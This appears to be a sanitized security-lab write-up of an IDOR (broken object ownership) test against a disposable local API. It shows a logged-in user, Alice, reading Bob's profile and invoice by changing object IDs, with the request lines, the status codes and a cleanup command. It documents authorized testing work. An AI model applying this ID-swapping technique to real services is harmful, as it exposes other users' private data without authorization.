> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# verified_lab_flow_modern_api_idor_object_ownership

Status: verified-impact / authorized local lab / disposable target
Date: 2026-05-22
Route/tool: Windows Hermes control plane -> SSH/SCP -> `<attacker-vm>` -> local disposable target `http://127.0.0.1:18080`
Target implementation: `labs/modern_vuln_api/modern_vuln_api.py`
Artifacts: `<artifact-output-dir>/modern_api_wave1_20260522T021059Z/`
Sources mapped: OWASP A01 Broken Access Control, CWE-639/IDOR patterns, HTB/API training-lab patterns, NVD/KEV auth/access-control pattern inspiration

## Why this target was added

Juice Shop produced useful access-control differentials but did not yet provide a clean own-object vs other-object proof. This disposable API target was added to create a recoverable local lab where object ownership can be verified without touching public systems.

## Preconditions

- Scope includes `127.0.0.1` and `localhost`.
- Target was deployed only on Kali local lab port `18080`.
- Test used built-in lab users `alice` and `bob`.

## Verified flow

1. Login as Alice:

```text
POST /api/login {"username":"alice","password":"alicepass"}
-> HTTP 200 token_present=true
```

2. Alice reads own objects:

```text
GET /api/users/1 -> HTTP 200 marker=PROFILE_MARKER_ALICE
GET /api/invoices/1001 -> HTTP 200 marker=ALICE_PRIVATE_INVOICE_MARKER
```

3. Alice reads Bob's objects by changing object IDs:

```text
GET /api/users/2 -> HTTP 200 marker=PROFILE_MARKER_BOB
GET /api/invoices/2001 -> HTTP 200 marker=BOB_PRIVATE_INVOICE_MARKER
```

## Impact

Level 4 lab impact: authenticated low-privilege user can access another user's profile and invoice object by direct object ID. This is a clear IDOR / broken object ownership proof.

## Evidence

- `<artifact-output-dir>/modern_api_wave1_20260522T021059Z/summary.md`
- `<artifact-output-dir>/modern_api_wave1_20260522T021059Z/observations.jsonl`
- Body artifacts:
  - `alice__api_users_2.json`
  - `alice__api_invoices_2001.json`

## Cleanup / recovery

The target is disposable. Stop with:

```bash
~/hermes-labs/modern_vuln_api/stop_modern_vuln_api.sh 18080
```

Post-health during the run remained HTTP 200.
